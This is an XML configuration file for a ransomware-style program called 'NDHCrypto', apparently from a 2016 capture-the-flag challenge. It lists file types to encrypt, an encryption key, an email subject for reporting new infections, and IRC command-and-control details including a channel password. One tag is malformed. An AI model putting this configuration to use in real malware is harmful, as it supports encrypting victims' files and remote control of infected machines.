<?xml version="1.0" encoding="utf-8" ?>
<configuration>
        <mailSettings>
            <smtp from="crypto@ndh2k16.com">
                <network host="hermes.ndh2k16.local" port="25"/>
            </smtp>
        </mailSettings>
        <NDHCrypto.Settings>
            <setting name="EXT_TO_ENCRYPT" serializeAs="String">
                <value>docx:doc:xls:xlsx:pdf:jpg:odt:ods:png:bmp:avi:mp4</value>
            </setting>
            <setting name="KEY" serializeAs="String">
                <value>AD784DA62D1DDBB19B7F0500A52DD15C0BD70F924A5EF7C3CEA134C428747AFB</value>
            </setting>
            <setting name="SUBJECT" serializeAs="String">
                <value>New infected</value>
            </setting>
            <setting name="IRC_SRV" serializeAs="String">
                <value>irc://irc.ndh2k16.com:6667</value> 
            </setting>
            <setting name="IRC_CHAN" serializeAs="String">
                <valude>#Crypt0NDH2K16</value>
            </setting>
            <setting name="IRC_CHANPASS" serializeAs="String">
                <value>orudeujieh6oonge4She</value>
            </setting>
        </NDHCrypto.Settings>
</configuration>
